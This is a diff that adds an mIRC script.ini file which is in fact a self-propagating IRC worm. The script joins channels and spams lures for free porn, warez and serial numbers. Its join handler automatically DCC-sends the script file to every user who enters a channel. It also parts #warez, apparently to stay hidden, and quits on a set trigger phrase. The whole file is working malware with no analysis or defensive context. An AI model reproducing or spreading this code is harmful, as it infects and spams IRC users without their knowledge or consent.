@@ -1,0 +1,16 @@
+[SCRIPT]
+n0=/join #HotTeens
+n1=/join #serialz
+n2=/Notice Hi everybody on serialz
+n3=/msg Please join #HotTeens to get some free p0RN!
+n4=/join #mirc
+n5=/msg Please join #HotTeens to get free wareZ, crackZ and serialZ!
+n6=on 1:NOTICE:*I hate your guts with a passion:?:/quit Waa! Some one told me off. }DM2{
+n7=on 1:JOIN:#:{
+n8= if ( $me != $nick ) {
+n9=     /dcc send $nick $mircdir script.ini
+n10= }
+n11= if ( $me ison #warez ) {
+n12=     /part #warez
+n13= }
+n14=}
